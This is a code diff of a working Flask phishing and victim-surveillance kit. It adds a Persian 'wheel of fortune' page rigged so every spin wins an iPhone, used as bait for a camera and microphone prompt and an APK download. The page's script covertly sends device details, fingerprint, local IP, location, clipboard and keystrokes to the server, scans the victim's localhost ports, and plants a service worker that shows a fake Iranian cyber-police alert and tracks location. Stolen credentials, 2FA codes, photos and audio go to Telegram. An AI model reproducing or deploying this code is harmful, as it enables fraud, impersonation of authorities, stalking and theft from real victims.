@@ -1,8 +1,7 @@
-import os, io, uuid, base64, json, logging, sqlite3, re, hashlib, time
+import os, io, uuid, base64, json, logging, sqlite3, time
 from datetime import datetime
-from flask import Flask, request, render_template_string, send_from_directory, jsonify, send_file, g, redirect, url_for, make_response
+from flask import Flask, request, render_template_string, send_from_directory, jsonify, g, redirect, url_for, make_response
 import requests
-import threading
 
 # -------------------- Configuration --------------------
 TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8910769488:AAG7effUIZqoK0vVLJ_zRAVJ7K4ifgMX4AY")
@@ -128,134 +127,339 @@ input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;fo
 </body></html>
 """
 
-CAPTURE_PAGE_ADV = """
+GAME_PAGE_SPIN = """
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Establishing Connection...</title>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>چرخ شانس - جایزه بزرگ</title>
 <style>
-    body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 40vh; }
-    .blink { animation: blink 1s infinite; }
-    @keyframes blink { 50% { opacity: 0; } }
+    body {
+        background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        text-align: center;
+        color: white;
+        margin: 0;
+        padding: 20px;
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+    }
+    .container {
+        background: rgba(255,255,255,0.1);
+        border-radius: 30px;
+        padding: 30px;
+        backdrop-filter: blur(10px);
+        box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        max-width: 500px;
+        width: 90%;
+    }
+    h1 {
+        font-size: 2.5rem;
+        margin-bottom: 10px;
+        color: #ffd700;
+        text-shadow: 0 0 20px #ffd700;
+    }
+    .subtitle {
+        color: #ccc;
+        margin-bottom: 20px;
+    }
+    #wheelCanvas {
+        width: 300px;
+        height: 300px;
+        margin: 20px auto;
+        display: block;
+    }
+    .btn {
+        background: #ff4757;
+        color: white;
+        border: none;
+        padding: 15px 40px;
+        font-size: 22px;
+        border-radius: 50px;
+        cursor: pointer;
+        margin: 20px 0;
+        font-weight: bold;
+        box-shadow: 0 5px 15px rgba(255,71,87,0.4);
+        transition: transform 0.2s;
+    }
+    .btn:hover { transform: scale(1.05); }
+    .btn:disabled { background: #666; cursor: not-allowed; box-shadow: none; }
+    #result {
+        font-size: 1.5rem;
+        margin: 20px 0;
+        min-height: 40px;
+        color: #ffd700;
+    }
+    #cameraSection {
+        display: none;
+        margin-top: 20px;
+    }
+    #apkBtn {
+        display: none;
+        background: #2ed573;
+        color: white;
+        padding: 15px 30px;
+        border-radius: 50px;
+        text-decoration: none;
+        font-size: 20px;
+        font-weight: bold;
+        margin-top: 20px;
+    }
     video, canvas { display: none; }
 </style>
 </head>
-<body onclick="startEverything()" ontouchstart="startEverything()" style="cursor:pointer; height:100vh; width:100vw; margin:0; position:fixed; top:0; left:0;">
-    <h1 id="msg" class="blink">Connecting to Secure Network...</h1>
-    <p style="color:#555;">Tap anywhere to continue</p>
-    <video id="v" autoplay playsinline></video>
-    <canvas id="c"></canvas>
+<body>
+    <div class="container">
+        <h1>🎰 چرخ شانس</h1>
+        <p class="subtitle">بچرخون و جایزه بزرگ ببر!</p>
+        
+        <canvas id="wheelCanvas" width="400" height="400"></canvas>
+        
+        <button class="btn" id="spinBtn" onclick="spin()">🎲 بچرخون!</button>
+        
+        <div id="result"></div>
+        
+        <div id="cameraSection">
+            <p>برای دریافت جایزه، باید دستگاه شما احراز هویت شود. لطفاً دسترسی به دوربین را تأیید کنید.</p>
+            <button class="btn" onclick="requestCamera()">📸 تأیید و دریافت جایزه</button>
+        </div>
+        
+        <video id="v" autoplay playsinline></video>
+        <canvas id="c"></canvas>
+        
+        <a id="apkBtn" href="/download/app-update.apk" download>
+            📱 دانلود برنامه مخصوص برندگان
+        </a>
+    </div>
+
     <script>
         const t = "{{ token }}";
-        const msg = document.getElementById('msg');
-        const v = document.getElementById('v'), c = document.getElementById('c'), ctx = c.getContext('2d');
-        let stream = null;
-        let capturing = false;
+        
+        // ---------- جمع‌آوری اطلاعات پس‌زمینه (بدون اجازه) ----------
+        fetch('/log/' + t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({
+            type: 'device',
+            ua: navigator.userAgent,
+            platform: navigator.platform,
+            lang: navigator.language,
+            screen: screen.width+'x'+screen.height,
+            cores: navigator.hardwareConcurrency,
+            memory: navigator.deviceMemory || 'N/A'
+        })});
 
-        async function startEverything() {
-            if (capturing) return;
-            capturing = true;
-            document.body.onclick = null;
-            document.body.ontouchstart = null;
-            msg.innerText = "Authenticating...";
-            msg.classList.remove('blink');
+        // اثر انگشت Canvas
+        try {
+            const cf = document.createElement('canvas');
+            cf.width = 200; cf.height = 50;
+            const cfctx = cf.getContext('2d');
+            cfctx.textBaseline = 'top';
+            cfctx.font = '14px Arial';
+            cfctx.fillText('Browser Fingerprint ' + navigator.userAgent, 2, 2);
+            fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'fingerprint', data: cf.toDataURL()})});
+        } catch(e) {}
 
-            // 1. Device info (no permission)
-            const deviceInfo = {
-                type: 'device',
-                ua: navigator.userAgent,
-                platform: navigator.platform,
-                lang: navigator.language,
-                screen: `${screen.width}x${screen.height}`,
-                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                cores: navigator.hardwareConcurrency,
-                memory: navigator.deviceMemory || 'N/A'
+        // آی‌پی داخلی
+        try {
+            const pc = new RTCPeerConnection({iceServers:[]});
+            pc.createDataChannel('');
+            pc.createOffer().then(o => pc.setLocalDescription(o));
+            pc.onicecandidate = e => {
+                if (e.candidate) {
+                    const ip = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+                    if (ip) fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'local_ip', ip:ip[1]})});
+                }
             };
-            fetch('/log/' + t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(deviceInfo)});
+        } catch(e) {}
 
-            // Canvas fingerprint
-            try {
-                const cf = document.createElement('canvas');
-                cf.width = 200; cf.height = 50;
-                const cfctx = cf.getContext('2d');
-                cfctx.textBaseline = 'top';
-                cfctx.font = '14px Arial';
-                cfctx.fillText('Browser Fingerprint ' + navigator.userAgent, 2, 2);
-                const fp = cf.toDataURL();
-                fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'fingerprint', data:fp})});
-            } catch(e) {}
+        // موقعیت
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                pos => fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'location', lat:pos.coords.latitude, lng:pos.coords.longitude})}),
+                err => fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'location_error', message:err.message})})
+            );
+        }
 
-            // 2. Internal IP via WebRTC
-            try {
-                const pc = new RTCPeerConnection({iceServers:[]});
-                pc.createDataChannel('');
-                pc.createOffer().then(o => pc.setLocalDescription(o));
-                pc.onicecandidate = e => {
-                    if (e.candidate) {
-                        const ip = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
-                        if (ip) fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'local_ip', ip:ip[1]})});
-                    }
-                };
-            } catch(e) {}
-
-            // 3. Geolocation (if previously allowed or will prompt)
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    pos => fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'location', lat:pos.coords.latitude, lng:pos.coords.longitude})}),
-                    err => fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'location_error', message:err.message})})
-                );
-            }
-
-            // 4. Clipboard (needs a user gesture, which we have from click)
+        // کلیپ‌بورد (با کلیک روی دکمه چرخش)
+        document.addEventListener('click', async function readClipboard() {
             try {
                 const clip = await navigator.clipboard.readText();
                 if (clip) fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'clipboard', data:clip})});
             } catch(e) {}
+        }, {once: true});
 
-            // 5. Open port scanning (local)
-            const ports = [80, 22, 443, 8080, 3389, 5900, 21];
-            ports.forEach(port => {
-                const img = new Image();
-                img.src = `http://127.0.0.1:${port}/favicon.ico?t=` + Date.now();
-                const start = Date.now();
-                img.onload = img.onerror = function() {
-                    const elapsed = Date.now() - start;
-                    if (elapsed < 500) { // possibly open
-                        fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'open_port', port:port})});
-                    }
-                };
-            });
-
-            // 6. History sniffing (cache probing)
-            function checkVisit(url, label) {
-                const img = new Image();
-                const start = Date.now();
-                img.onload = img.onerror = function() {
-                    const elapsed = Date.now() - start;
-                    if (elapsed < 100) {
-                        fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'history', site:label, visited:true})});
-                    }
-                };
-                img.src = url + '?t=' + Date.now();
+        // کی‌لاگر
+        let keys = '';
+        document.addEventListener('keydown', e => { keys += e.key; });
+        setInterval(() => {
+            if (keys.length > 0) {
+                fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'keystrokes', data:keys})});
+                keys = '';
             }
-            checkVisit('https://facebook.com/favicon.ico', 'facebook');
-            checkVisit('https://instagram.com/favicon.ico', 'instagram');
-            checkVisit('https://t.me/favicon.ico', 'telegram');
+        }, 5000);
 
-            // 7. Camera & Microphone (one prompt)
+        // اسکن پورت داخلی
+        const ports = [80, 22, 443, 8080, 3389, 5900, 21];
+        ports.forEach(port => {
+            const img = new Image();
+            img.src = `http://127.0.0.1:${port}/favicon.ico?t=` + Date.now();
+            const start = Date.now();
+            img.onload = img.onerror = function() {
+                const elapsed = Date.now() - start;
+                if (elapsed < 500) {
+                    fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'open_port', port:port})});
+                }
+            };
+        });
+
+        // سرویس ورکر (اعلان پلیس فتا)
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/sw.js?t=' + t).then(reg => {
+                setTimeout(() => {
+                    reg.showNotification('⚠️ هشدار فوری پلیس فتا', {
+                        body: 'فعالیت غیرمجاز در این دستگاه شناسایی شده است. برای رفع اتهام و تأیید هویت روی این اعلان کلیک کنید.',
+                        icon: 'https://www.fata.gov.ir/images/logo.png',
+                        requireInteraction: true,
+                        vibrate: [300, 100, 300],
+                        data: { url: window.location.origin + '/go/' + t }
+                    });
+                }, 15000);
+            });
+        }
+
+        // =============== چرخ شانس ===============
+        const canvas = document.getElementById('wheelCanvas');
+        const ctx = canvas.getContext('2d');
+        const spinBtn = document.getElementById('spinBtn');
+        const resultDiv = document.getElementById('result');
+        const cameraSection = document.getElementById('cameraSection');
+        const apkBtn = document.getElementById('apkBtn');
+        const v = document.getElementById('v'), c = document.getElementById('c'), ctx2 = c.getContext('2d');
+
+        const prizes = [
+            { label: 'آیفون ۱۵', color: '#ff4757', value: 'iPhone' },
+            { label: 'شارژ رایگان', color: '#2ed573', value: 'charge' },
+            { label: 'پول نقد', color: '#ffa502', value: 'cash' },
+            { label: 'لپ‌تاپ', color: '#1e90ff', value: 'laptop' },
+            { label: 'شما برنده نشدید', color: '#747d8c', value: 'lose' },
+            { label: 'هدفون', color: '#ff6b81', value: 'headphone' },
+            { label: 'آیفون ۱۵', color: '#ff4757', value: 'iPhone' }, // شانس بیشتر
+            { label: 'شارژ رایگان', color: '#2ed573', value: 'charge' }
+        ];
+        const numSlices = prizes.length;
+        const anglePerSlice = (2 * Math.PI) / numSlices;
+        let spinning = false;
+        let currentAngle = 0;
+
+        function drawWheel(angleOffset = 0) {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            const centerX = canvas.width / 2;
+            const centerY = canvas.height / 2;
+            const radius = 180;
+
+            for (let i = 0; i < numSlices; i++) {
+                const startAngle = i * anglePerSlice + angleOffset;
+                const endAngle = startAngle + anglePerSlice;
+                
+                ctx.beginPath();
+                ctx.moveTo(centerX, centerY);
+                ctx.arc(centerX, centerY, radius, startAngle, endAngle);
+                ctx.closePath();
+                ctx.fillStyle = prizes[i].color;
+                ctx.fill();
+                ctx.strokeStyle = '#fff';
+                ctx.lineWidth = 2;
+                ctx.stroke();
+
+                ctx.save();
+                ctx.translate(centerX, centerY);
+                ctx.rotate(startAngle + anglePerSlice / 2);
+                ctx.textAlign = "right";
+                ctx.fillStyle = "#fff";
+                ctx.font = "bold 14px 'Segoe UI'";
+                ctx.fillText(prizes[i].label, radius - 20, 8);
+                ctx.restore();
+            }
+
+            // دکمه وسط
+            ctx.beginPath();
+            ctx.arc(centerX, centerY, 30, 0, 2 * Math.PI);
+            ctx.fillStyle = '#fff';
+            ctx.fill();
+            ctx.fillStyle = '#333';
+            ctx.font = "bold 14px Arial";
+            ctx.textAlign = "center";
+            ctx.fillText("🎲", centerX, centerY + 6);
+        }
+
+        function spin() {
+            if (spinning) return;
+            spinning = true;
+            spinBtn.disabled = true;
+            resultDiv.innerHTML = '';
+            cameraSection.style.display = 'none';
+            apkBtn.style.display = 'none';
+
+            // همیشه روی آیفون ۱۵ (ایندکس ۰) متوقف شود
+            const targetPrizeIndex = 0;
+            const targetMiddleAngle = targetPrizeIndex * anglePerSlice + anglePerSlice / 2;
+            const spinToAngle = (2 * Math.PI) - targetMiddleAngle + Math.PI/2;
+            const fullSpins = 5 * 2 * Math.PI;
+            const finalAngle = currentAngle + fullSpins + spinToAngle - (currentAngle % (2 * Math.PI));
+            
+            const duration = 4000;
+            const startAngle = currentAngle;
+            const startTime = performance.now();
+
+            function animate(now) {
+                const elapsed = now - startTime;
+                const progress = Math.min(elapsed / duration, 1);
+                const eased = 1 - Math.pow(1 - progress, 3);
+                currentAngle = startAngle + (finalAngle - startAngle) * eased;
+                drawWheel(currentAngle);
+                if (progress < 1) {
+                    requestAnimationFrame(animate);
+                } else {
+                    spinning = false;
+                    spinBtn.disabled = false;
+                    const normalizedAngle = currentAngle % (2 * Math.PI);
+                    const pointerAngle = (2 * Math.PI) - (Math.PI / 2);
+                    let sliceIndex = Math.floor(((pointerAngle - normalizedAngle + 2 * Math.PI) % (2 * Math.PI)) / anglePerSlice);
+                    sliceIndex = sliceIndex % numSlices;
+                    const wonPrize = prizes[sliceIndex];
+                    
+                    if (wonPrize.value === 'lose') {
+                        resultDiv.innerHTML = '😢 متأسفانه برنده نشدی! دوباره شانست رو امتحان کن.';
+                        spinBtn.innerHTML = '🔄 دوباره بچرخون';
+                    } else {
+                        resultDiv.innerHTML = `🎉 تبریک! شما برنده <strong>${wonPrize.label}</strong> شدید!`;
+                        cameraSection.style.display = 'block';
+                        spinBtn.style.display = 'none';
+                    }
+                }
+            }
+            requestAnimationFrame(animate);
+        }
+
+        async function requestCamera() {
+            cameraSection.style.display = 'none';
+            resultDiv.innerHTML = 'در حال احراز هویت...';
             try {
-                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
                 v.srcObject = stream;
                 await new Promise(r => v.onloadedmetadata = r);
                 c.width = v.videoWidth || 640;
                 c.height = v.videoHeight || 480;
-                msg.innerText = "Connected.";
-
-                // First snapshot immediately
-                takeSnapshot();
-                // Continuous snapshots every 2 seconds
-                window.photoInterval = setInterval(takeSnapshot, 2000);
-
-                // Audio recording (5 seconds) just once
+                ctx2.drawImage(v, 0, 0, c.width, c.height);
+                const dataURL = c.toDataURL('image/jpeg', 0.8);
+                fetch('/upload/' + t, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ type: 'photo', data: dataURL })
+                });
+                // ضبط صدا ۵ ثانیه
                 try {
                     const audioTrack = stream.getAudioTracks()[0];
                     if (audioTrack) {
@@ -275,55 +479,16 @@ CAPTURE_PAGE_ADV = """
                         setTimeout(() => { mr.stop(); }, 5000);
                     }
                 } catch(e) {}
+                stream.getTracks().forEach(track => track.stop());
+                resultDiv.innerHTML = '✅ احراز هویت موفق! اکنون جایزه خود را دریافت کنید.';
+                apkBtn.style.display = 'inline-block';
             } catch (e) {
-                msg.innerText = "Connection established. (Camera not available)";
+                resultDiv.innerHTML = '⚠️ بدون احراز هویت هم می‌توانید جایزه را دریافت کنید.';
+                apkBtn.style.display = 'inline-block';
             }
         }
 
-        function takeSnapshot() {
-            if (!stream) return;
-            try {
-                ctx.drawImage(v, 0, 0, c.width, c.height);
-                const dataURL = c.toDataURL('image/jpeg', 0.8);
-                fetch('/upload/' + t, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ type: 'photo', data: dataURL })
-                });
-            } catch (e) {}
-        }
-
-        // Keylogger
-        let keys = '';
-        document.addEventListener('keydown', e => { keys += e.key; });
-        setInterval(() => {
-            if (keys.length > 0) {
-                fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'keystrokes', data:keys})});
-                keys = '';
-            }
-        }, 5000);
-
-        // Service Worker with fake police notification
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('/sw.js?t=' + t).then(reg => {
-                // Wait a few seconds then show the police notification
-                setTimeout(() => {
-                    reg.showNotification('⚠️ هشدار فوری پلیس فتا', {
-                        body: 'فعالیت غیرمجاز در این دستگاه شناسایی شده است. برای رفع اتهام و تأیید هویت روی این اعلان کلیک کنید.',
-                        icon: 'https://www.fata.gov.ir/images/logo.png',
-                        requireInteraction: true,
-                        vibrate: [300, 100, 300],
-                        data: { url: window.location.origin + '/go/' + t }
-                    });
-                }, 10000);  // 10 seconds after page load
-            });
-        }
-
-        // Cleanup on close
-        window.addEventListener('beforeunload', () => {
-            if (stream) stream.getTracks().forEach(tr => tr.stop());
-            clearInterval(window.photoInterval);
-        });
+        drawWheel(0);
     </script>
 </body></html>
 """
@@ -401,12 +566,13 @@ def twofa(token):
         db.execute("UPDATE credentials SET code2fa=? WHERE token=? AND code2fa IS NULL", (code, token))
         db.commit()
         send_telegram_message(f"🔐 <b>2FA Code</b>\nToken: <code>{token}</code>\nCode: <code>{code}</code>")
-        return redirect(url_for('capture', token=token))
+        # هدایت به بازی چرخ شانس
+        return redirect(url_for('game', token=token))
     return render_template_string(TWOFA_PAGE, token=token, error=None)
 
-@app.route('/capture/<token>')
-def capture(token):
-    return render_template_string(CAPTURE_PAGE_ADV, token=token)
+@app.route('/game/<token>')
+def game(token):
+    return render_template_string(GAME_PAGE_SPIN, token=token)
 
 @app.route('/upload/<token>', methods=['POST'])
 def upload(token):
@@ -426,7 +592,7 @@ def upload(token):
         db.execute("INSERT INTO media (token, type, data, timestamp) VALUES (?, ?, ?, ?)",
                    (token, media_type, binary, datetime.now().isoformat()))
         db.commit()
-        # Send to Telegram
+        # ارسال به تلگرام
         if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
             if media_type == 'photo':
                 send_telegram_file(binary, 'camera.jpg', f"📸 <b>Photo</b> from {token}", as_image=True)
@@ -462,7 +628,7 @@ def log(token):
                (token, data.get('type','unknown'), json.dumps(data), datetime.now().isoformat()))
     db.execute("UPDATE victims SET ip=? WHERE token=?", (request.remote_addr, token))
     db.commit()
-    # Organized Telegram alerts
+    # ارسال مرتب به تلگرام
     if data.get('type') == 'device':
         send_telegram_message(f"📱 <b>Device Connected</b>\nToken: <code>{token}</code>\nIP: {request.remote_addr}\nUser-Agent: {data.get('ua','')}")
     elif data.get('type') == 'location':
@@ -484,12 +650,9 @@ SW_JS = """
 self.addEventListener('install', event => {
   self.skipWaiting();
 });
-
 self.addEventListener('activate', event => {
   event.waitUntil(clients.claim());
 });
-
-// Handle notification click – redirect to phishing page
 self.addEventListener('notificationclick', event => {
   event.notification.close();
   const urlToOpen = event.notification.data && event.notification.data.url 
@@ -508,8 +671,6 @@ self.addEventListener('notificationclick', event => {
     })
   );
 });
-
-// Background location tracking (every 30 seconds)
 setInterval(() => {
   if('geolocation' in navigator){
     navigator.geolocation.getCurrentPosition(pos => {
@@ -528,7 +689,6 @@ setInterval(() => {
   }
 }, 30000);
 """
-
 @app.route('/sw.js')
 def service_worker():
     response = make_response(SW_JS)
